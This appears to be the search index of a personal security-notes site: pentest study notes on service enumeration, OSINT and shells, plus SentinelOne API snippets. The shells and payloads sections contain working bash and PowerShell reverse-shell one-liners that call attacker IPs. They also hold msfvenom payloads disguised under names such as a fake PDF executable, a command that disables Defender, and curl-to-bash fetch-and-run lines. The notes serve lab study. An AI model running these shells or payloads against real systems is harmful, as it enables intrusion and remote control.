{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Security Notes","text":"<p>Welcome to my personal knowledge base.</p>"},{"location":"#categories","title":"Categories","text":"<ul> <li> <p>Offensive Security</p> </li> <li> <p>Engineering</p> </li> <li> <p>Certifications</p> </li> </ul>"},{"location":"certifications/","title":"Certification Notes","text":"<p>Study notes and guides for certifications.</p>"},{"location":"engineering/","title":"Engineering","text":"<p>Notes on security engineering and automation.</p>"},{"location":"engineering/sentinelone-api/","title":"SentinelOne API Quick Start","text":"<p>Common endpoints and Python snippets for automation.</p>"},{"location":"engineering/sentinelone-api/#authentication","title":"Authentication","text":"<p>Headers required for all requests.</p> <pre><code>headers = {\n    \"Authorization\": \"ApiToken &lt;YOUR_API_TOKEN&gt;\",\n    \"Content-Type\": \"application/json\"\n}\nbase_url = \"https://usea1-001.sentinelone.net/web/api/v2.1\"\n</code></pre>"},{"location":"engineering/sentinelone-api/#get-agent-info","title":"Get Agent Info","text":"<p>Retrieve details for a specific endpoint by hostname.</p> <pre><code>def get_agent_id(hostname):\n    params = {\n        \"computerName\": hostname,\n        \"isActive\": True\n    }\n    response = requests.get(f\"{base_url}/agents\", headers=headers, params=params)\n    return response.json()['data'][0]['id']\n</code></pre>"},{"location":"engineering/sentinelone-api/#isolate-endpoint","title":"Isolate Endpoint","text":"<p>Warning: This disconnects the host from the network.</p> <pre><code>def isolate_host(agent_id):\n    payload = {\n        \"filter\": {\n            \"ids\": [agent_id]\n        }\n    }\n    response = requests.post(f\"{base_url}/agents/actions/disconnect\", headers=headers, json=payload)\n    return response.status_code\n</code></pre>"},{"location":"engineering/sentinelone-api/#fetch-threat-notes","title":"Fetch Threat Notes","text":"<p>Get analyst notes attached to a specific threat ID.</p> <pre><code>GET /threats/{threat_id}/notes\n# Useful for syncing S1 notes to Jira/ServiceNow\n</code></pre>"},{"location":"offensive-security/","title":"Offensive Security","text":"<p>Notes on offensive security methodologies.</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Enumeration%20basics/","title":"Port scanning","text":"<p>nmap: nmap   $target <p>-A      Aggressive - scans everything -Pn      disables icmp echo requets treat host as online (used if machine does not respond to Ping) -sU     UDP port scan -p-     all ports65565 -p     (-p80,443,22) scan only those ports -sV     - service scan  --top-ports=10     - scan the top 10 ports (can be changed) --packet-trace     - traces all packets sent and received  -disable-arp-ping --script     runs specified scripts in target"},{"location":"offensive-security/1.%20Information%20Gathering/Enumeration%20basics/#firewallidsips-bypass-techniques","title":"firewall/ids/ips bypass techniques","text":"<p>-D RND:5     -randomly generates 5 ips to appear as source address -S     - pick and choose source ip --source-port 53     - changes source port to 53</p> <p>offical site:https://nmap.org/book/man-port-scanning-techniques.html</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Enumeration%20basics/#smb-ldap-kerberos","title":"SMB, ldap, Kerberos","text":"<p>enum4linx -a $target</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Enumeration%20basics/#ldap","title":"LDAP","text":"<p>ldapsearch</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Enumeration%20basics/#httphttps","title":"HTTP/HTTPS","text":"<ul> <li>Visit the site<ul> <li>click away and see what you can find</li> <li>How does the application work?</li> <li>any login pages?<ul> <li>User or admin</li> <li>defult creds?</li> </ul> </li> </ul> </li> </ul> <p>-web vulnerability scanning tools     - Nikto - Directory busting Tools     - FFUF     - Dirbuster     - Dirb     - Gobuster</p>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/example_checklist/","title":"Example checklist","text":""},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/example_checklist/#example-checklist","title":"example checklist","text":"<ul> <li>Ensure ROE is signed by client</li> <li>add IPs to scope</li> <li>verify scope</li> <li>send kickoff email to client</li> <li>conduct vulnerability scanning with Nessus</li> <li>identify emails/users/pass in breached databases</li> <li>identify client websites and search for any data useful to help attack</li> <li>attempt to enumerate any accounts on portals, password reset functions</li> <li>run web app scans, if necessary</li> <li>conduct manual testing and exploitation on targets</li> <li>validate scanning tool vulnerabilities </li> <li>conduct password spraying guessing and brute force no login portals</li> <li>escalate access from external to internal</li> <li>validate previous findings from last year have been resolved</li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/","title":"External","text":""},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#external-pentest","title":"external Pentest","text":""},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#using-certsh","title":"using certsh","text":"<pre><code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\n## sorting list m\nfor i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#subdomains","title":"subdomains","text":"<p><pre><code>sublist3r -d $domain\n</code></pre> owasp amass</p> <p>tomnomnom </p>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#whois","title":"whois","text":"<pre><code>whois $domain\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#pull-dns-records","title":"pull dns records","text":"<p><pre><code> dig any $domain\n</code></pre> DNS Record Enumeration: Query DNS for important records. For example, use dig or nslookup to find: - A/AAAA records \u2013 host addresses for domain and subdomains (dig A example.com). - NS records \u2013 name servers (dig NS example.com). - MX records \u2013 mail exchangers (dig MX example.com) \u2013 check if they point to *.protection.outlook.com (indicates Office 365 email hosting) - TXT records \u2013 especially SPF, DKIM, and DMARC (dig TXT example.com) to see email security configurations. <pre><code>nslookup\n</code></pre></p>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#the-harvester","title":"the harvester","text":"<pre><code>theHarvester -d example.com -b google\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#people","title":"people","text":"<ul> <li>public reords </li> <li>job postings </li> <li>linkedin </li> <li>X</li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#getting-email-addresses","title":"getting email addresses","text":"<ul> <li>hunter.io</li> <li>phonebook.cz</li> <li>Clear it</li> <li>google search</li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#getting-passwords","title":"getting passwords","text":"<p>Dehashed.com</p> <ul> <li>common password  seasons  company names street namws  nearby sports teams </li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#other","title":"other","text":"<ul> <li>github </li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#google-fu","title":"google fu","text":"<p>want specific site? site: ___.com</p> <p>subtract things  (-) www</p> <p>search for a file? filetype: pdf, csv, docx etc</p>"},{"location":"offensive-security/1.%20Information%20Gathering/OSINT/external/#confirming-valid-accounts","title":"confirming valid accounts","text":"<pre><code>MailSniper\n\nAADInternals\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/143%20-%20993%20-%20IMAP%20%26%20POP3/","title":"143   993   IMAP & POP3","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/143%20-%20993%20-%20IMAP%20%26%20POP3/#imaps-commands","title":"Imaps commands:","text":"<p>1 LOGIN username password   User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\"    Creates a mailbox with a specified name. 1 DELETE \"INBOX\"    Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\"   Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being\u00a0active\u00a0or\u00a0subscribed. 1 SELECT INBOX  Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX    Exits the selected mailbox. 1 FETCH  all    Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the\u00a0Deleted\u00a0flag set. 1 LOGOUT    Closes the connection with the IMAP server."},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/143%20-%20993%20-%20IMAP%20%26%20POP3/#pop3-commands","title":"POP3 commands:","text":"<p>USER username   Identifies the user. PASS password   Authentication of the user using its password. STAT    Requests the number of saved emails from the server. LIST    Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA    Requests the server to display the server capabilities. RSET    Requests the server to reset the transmitted information. QUIT    Closes the connection with the POP3 server.</p> <pre><code>curl -k 'imaps://$target' --user cry0l1t3:1234 -v\ncurl -k 'imaps://$target' --user user:p4ssw0rd\n\n#if there is encrypted ports open\nopenssl s_client -connect $target:pop3s\nopenssl s_client -connect $target:imaps\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/1433/","title":"1433","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/1433/#mssql","title":"mssql","text":"<pre><code>python3 mssqlclient.py Administrator@$target -windows-auth\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/161%20-%20snmp/","title":"161   snmp","text":"<pre><code>snmpwalk -v2c -c public $target\n\nsnmpwalk -v1 -c public $target &gt; snmp.txt\n</code></pre> <pre><code>sudo apt install onesixtyone\n\nonesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt $target\n</code></pre> <pre><code>sudo apt install braa\nbraa &lt;community string&gt;@$target:.1.3.6.*   # Syntax\n\nbraa public@$target:.1.3.6.*\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/2049%20open%20nfs/","title":"2049/tcp nfs = network file system","text":"<pre><code>mount -t nfs 172.30.217.107:/srv/nfs /mnt/dev\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/2049%20open%20nfs/#view-shares","title":"view shares","text":"<ul> <li>to view the shares</li> </ul> <pre><code>showmount -e $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/2049%20open%20nfs/#one-liner","title":"one liner","text":"<pre><code>sudo mkdir NFS &amp;&amp; sudo mount -t nfs $target:/&lt;sharename&gt; ./NFS\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/21%20-%20FTP/","title":"21 - FTP","text":"<ul> <li>can be used with anonmyous login</li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/21%20-%20FTP/#scanning-port","title":"scanning port","text":"<pre><code>sudo nmap -sV -p21 -sC -A $target --script ftp*\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/21%20-%20FTP/#helpful-commands","title":"helpful commands","text":"<ul> <li>Trace</li> <li>Status's</li> <li>Debug</li> <li>get <ul> <li>Downlaods files</li> </ul> </li> <li>put<ul> <li>uploads files</li> </ul> </li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/21%20-%20FTP/#conncting-to-port","title":"conncting to port","text":"<pre><code>sudo ftp $target \n\n## if you have creds \nftp &lt;user&gt;@$target\n\n## if ftp on non-standard port \nftp $target &lt;port&gt;\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/21%20-%20FTP/#downloading-all-files","title":"downloading all files","text":"<ul> <li>if you have creds, use following wget command to dump all files in the share <pre><code>wget -m --no-passive ftp://anonymous:anonymous@$target\n</code></pre></li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/23%20-%20Telnet/","title":"How to sign in?","text":"<pre><code>Telnet &lt;Ip&gt;\n    You can use this to test any open port\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/25%20-%20SMTP/","title":"25   SMTP","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/25%20-%20SMTP/#overview","title":"overview","text":"<p>The\u00a0Simple Mail Transfer Protocol\u00a0(SMTP) is a protocol for sending emails in an IP network</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/25%20-%20SMTP/#commands","title":"commands","text":"<p>AUTH PLAIN  - AUTH is a service extension used to authenticate the client. HELO    - The client logs in with its computer name and thus starts the session. MAIL FROM   - The client names the email sender. RCPT TO - The client names the email recipient. DATA    - The client initiates the transmission of the email. RSET    - The client aborts the initiated transmission but keeps the connection between client and server. VRFY    - The client checks if a mailbox is available for message transfer. EXPN    - The client also checks if a mailbox is available for messaging with this command. NOOP    - The client requests a response from the server to prevent disconnection due to time-out. QUIT    - The client terminates the session.</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/25%20-%20SMTP/#help","title":"help","text":"<pre><code>sudo nmap $target -sC -sV -p25\n\nsudo nmap $target -p25 --script smtp-open-relay -v\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/27017%20-%20Mongodb/","title":"27017   Mongodb","text":"<p>Downloading mongodb utility <pre><code>curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz\n</code></pre> extract it  <pre><code> tar xvf mongodb-linux-x86_64-3.4.7.tgz\n</code></pre> navigate to the dir  <pre><code>cd mongodb-linux-x86_64-3.4.7/bin\n</code></pre> access the database <pre><code>./mongo mongodb://{target_IP}:27017\n</code></pre> helpful db commands     show dbs;         show databases     use          picks what collection you want to go into     show          shows everything in that collection"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3306%20-%20MySQL/","title":"3306   MySQL","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3306%20-%20MySQL/#scanning","title":"scanning","text":"<pre><code>sudo nmap $target -sV -sC -p3306 --script mysql*\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3306%20-%20MySQL/#connecting-to-service","title":"connecting to service","text":"<pre><code>mysql -u &lt;username&gt; -p&lt;password&gt; -h $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3306%20-%20MySQL/#database-commmands","title":"Database commmands:","text":"<pre><code>mysql&gt; use sys;\nmysql&gt; show tables;  \nmysql&gt; select host, unique_users from host_summary;\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3389%20-%20RDP%20/","title":"RDP","text":"<p>xfreerdp  - Linux tool to use RDP client on a windows machine install with the following command <pre><code>sudo apt-get install freerdp2-x11\n</code></pre></p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/3389%20-%20RDP%20/#connecting-using-sfreerdp","title":"connecting using sfreerdp","text":"<pre><code>xfreerdp /u:$user /p:\"$pass!\" /v:$target \n</code></pre> <ul> <li>/cert:ignore : Specifies to the scrips that all security certificate usage should be ignored.</li> <li>/u:Administrator : Specifies the login username to be \"Administrator\".</li> <li>/v:{$target} : Specifies the target IP of the host we would like to connect to.</li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/","title":"ShareEnumeration:","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#smbclient","title":"smbclient","text":"<pre><code>smbclient \\\\\\\\$target\\\\$share -U &lt;username&gt;\n## Listing shares\nsmbclient -L $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#psexecpy","title":"psexec.py","text":"<pre><code>psexec.py -target-ip $target -p 445 -u\npsexec.py &lt;username&gt;: &lt;'Password'&gt;: $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#other-tools","title":"other tools","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#roc-client","title":"roc client","text":"<pre><code>rpcclient -U \"&lt;username&gt;\" $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#impacket-samrdumppy","title":"Impacket - Samrdump.py","text":"<pre><code>samrdump.py $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#smbmap","title":"SMBmap","text":"<pre><code>smbmap -H $target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#crackmapexec","title":"CrackMapExec","text":"<pre><code>crackmapexec smb $target --shares -u '' -p ''\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#enum4linux-ng","title":"enum4linux-ng","text":"<pre><code>./enum4linux-ng.py $target -A\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#netexec","title":"Netexec","text":"<pre><code>netexec smb $target --shares -u '' -p ''\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#conncting-to-share","title":"conncting to share","text":"<pre><code>smbclient -N -L //$target\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/445%20-%20SMB/#user-enumeration","title":"User enumeration:","text":"<pre><code>netexec smb $target \n\n## Get users\nnetexec smb $target -u '' -p '' --users\n\nnetexec smb $target -u '' -p '' --rid-brute\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/53%20%20-%20DNS/","title":"53    DNS","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/53%20%20-%20DNS/#records","title":"records:","text":"<p>A   - Returns an IPv4 address of the requested domain as a result. AAAA    - Returns an IPv6 address of the requested domain. MX  - Returns the responsible mail servers as a result. NS  - Returns the DNS servers (nameservers) of the domain. TXT - This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. CNAME - This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu. PTR - The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names. SOA- Provides information about the corresponding DNS zone and email address of the administrative contact.</p> <pre><code>dnsenum --dnsserver $target --enum &lt;Domain&gt;\n\ndig soa $doamin\n\ndig ns $doamin @$target\ndig CH TXT $doamin @$target\ndig any $doamin @$target\ndig axfr $doamin @$target\ndig axfr $doamin @$target\n\ndnsenum --dnsserver $target --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/6379%20-%20Redis/","title":"6379   Redis","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/6379%20-%20Redis/#what-is-it","title":"What is it?","text":"<p>Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency.</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/6379%20-%20Redis/#tools","title":"tools","text":"<p>how to install the tools?     sudo apt install redis-tools How to access it?     redis-cli -h"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/6379%20-%20Redis/#helpful-commands","title":"helpful commands","text":"<pre><code>info \n    database version\nselect \n    chose the database number\nkeys *\n    view all keys present in the chosen database\nget \n    grabs key or file from server\n</code></pre>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/80-443%20-%20HTTP/","title":"HTTP/HTTPS","text":"<ol> <li>enumerate directories<ol> <li>dirbuster</li> </ol> </li> <li>gather info on the app<ol> <li>what is its purpose?</li> <li>what is the app doing</li> <li>Login pages?</li> <li>Defult creds?</li> </ol> </li> </ol> <p>try some injection     1. sql     2. code injection</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/873%20-%20Rsync/","title":"873   Rsync","text":"<p>view public share     rsync --list-only {target_IP}:: view files in said share      rsync --list-only {target_IP}::public copy a file to a file from the share in question     rsync {target_IP}::public/flag.txt flag.txt</p>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/88%20-%20Kerberos/","title":"88   Kerberos","text":""},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/88%20-%20Kerberos/#common-exploits","title":"Common exploits","text":"<ul> <li>kerberos roasting<ul> <li>This is where we can take the domain and user name (SPN) and try to get a TGT (Ticket Granting ticket) We can then attempt to crask the hash to get the user password (This will be exachnegd in the kerberos authenticaiton)</li> </ul> </li> </ul>"},{"location":"offensive-security/1.%20Information%20Gathering/Service%20Enumeration/88%20-%20Kerberos/#asperosting","title":"asperosting","text":"<pre><code>GetNPUsers &lt;domain&gt; -dc.ip $target -usersfile &lt;filename&gt; -outfile &lt;filename&gt;\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Payloads/","title":"Payloads","text":"<p>msfvenom      -p payload     ex         /OS/ARCH/shell         windows/x64/shell_reverse_tcp     lhost (your atttacker box IP)     Lport (your attacker box port to connect to)     -f - File type     full example     msfvenom -p /windows/x64/shell_reverse_tcp -f exe &gt; wise.exe</p> <p>MSI  <pre><code>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f msi -o reverse.msi`\n</code></pre></p> <p>msfvenom      -p payload     ex         /OS/ARCH/shell         windows/x64/shell_reverse_tcp     lhost (your atttacker box IP)     Lport (your attacker box port to connect to)     -f - File type     full example     msfvenom -p /windows/x64/shell_reverse_tcp -f exe &gt; wise.exe</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Port%20forwarding/","title":"Port forwarding","text":"<p>How would we use this?</p> <p>2 main reasons</p> <p>We want to get to another network on our host.     the host is dual honned and we can get to the other network and see what is available</p> <p>we want to access another protocol on the same device     smb     mysql     ssh any port that is listening on .0.0.0.0: can be forwarded with plink https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/","title":"Shells","text":"<p>One liner bash shell <pre><code>bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/443 0&gt;&amp;1\"\n</code></pre></p> <p>How to make a fully interactive shell <pre><code>## Python version needed for this to run properly\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' \nCTRL+Z \nstty raw \n-echo \nfg \nexport TERM=xterm\n\n#not all steps may be needed\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#bind-shells","title":"Bind Shells","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#what-is-it","title":"What Is It?","text":"<p>With a bind shell, the\u00a0<code>target</code>\u00a0system has a listener started and awaits a connection from a pentester's system (attack box).</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#no-1-server-target-starting-netcat-listener","title":"No. 1: Server - Target starting Netcat listener","text":"<pre><code>Target@server:~$ nc -lvnp 7777\n</code></pre> <p>In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.</p> <p>Back on the client (attack box), we will use nc to connect to the listener we started on the server.</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#no-2-client-attack-box-connecting-to-target","title":"No. 2: Client - Attack box connecting to target","text":"<pre><code>nc -nv 10.129.41.200 7777 \n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#no-3-server-target-receiving-connection-from-client","title":"No. 3: Server - Target receiving connection from client","text":"<pre><code>Target@server:~$ nc -lvnp 7777\n</code></pre> <p>Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#reverse-shell","title":"Reverse shell","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#server-attack-box","title":"Server (<code>attack box</code>)","text":"<p>Reverse Shells <pre><code>sudo nc -lvnp 443Listening on 0.0.0.0 443\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#powerhsell-reverse-shell","title":"powerhsell reverse shell","text":"<pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$serverip',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>The\u00a0<code>Windows Defender antivirus</code>\u00a0(<code>AV</code>) software stopped the execution of the code. This is working exactly as intended, and from a\u00a0<code>defensive</code>\u00a0perspective, this is a\u00a0<code>win</code>. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the\u00a0<code>Virus &amp; threat protection settings</code>\u00a0or by using this command in an administrative PowerShell console (right-click, run as admin):</p>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#disable-av","title":"Disable AV","text":"<pre><code>PS C:\\Users\\htb-student&gt; Set-MpPreference -DisableRealtimeMonitoring $true\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#one-liner","title":"One Liner","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#bash","title":"Bash","text":"<pre><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.14.12 7777 &gt; /tmp/f\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#powershell","title":"Powershell","text":"<pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#crafting-payloads-with-msfvenom","title":"crafting payloads with msfvenom","text":"<pre><code>msfvenom -l payloads\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/Shells/#stageless","title":"stageless","text":"<p><pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf\n</code></pre> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe\n</code></pre></p>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux%20mangemeent%20tooling/","title":"Linux mangemeent tooling","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux%20mangemeent%20tooling/#ssh","title":"SSH","text":"<pre><code>ssh -v cry0l1t3@$target\n\n#bypass need for keys and force client to take password auth\nssh -v cry0l1t3@$target -o PreferredAuthentications=password\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux%20mangemeent%20tooling/#rsync","title":"rsync","text":"<pre><code>sudo nmap -sV -p 873 127.0.0.1\n\nnc -nv 127.0.0.1 873\n\n##using tooling\nrsync -av --list-only rsync://127.0.0.1/dev\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux%20mangemeent%20tooling/#rservies","title":"rservies","text":"<pre><code>sudo nmap -sV -p 512,513,514 $target\n\n## using tooling\nrlogin 10.0.17.2 -l htb-student\n\n## Gathering list of users\nrwho\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/","title":"Linux file downloads","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#base64","title":"Base64","text":"<pre><code>## converting file to Base64\ncat id_rsa |base64 -w 0;echo\n\n## converting back\necho -n '&lt;encoded_String&gt;' | base64 -d &gt; id_rs\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#tools","title":"tools","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#wget","title":"wget","text":"<pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#curl","title":"curl","text":"<pre><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#files-downloads","title":"files downloads","text":""},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#curl_1","title":"curl","text":"<pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#wget_1","title":"wget","text":"<pre><code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n</code></pre>"},{"location":"offensive-security/2.%20Pre-Exploitation/linux_file_downloads/#scp","title":"SCP","text":"<pre><code>scp plaintext@$target:/root/myroot.txt 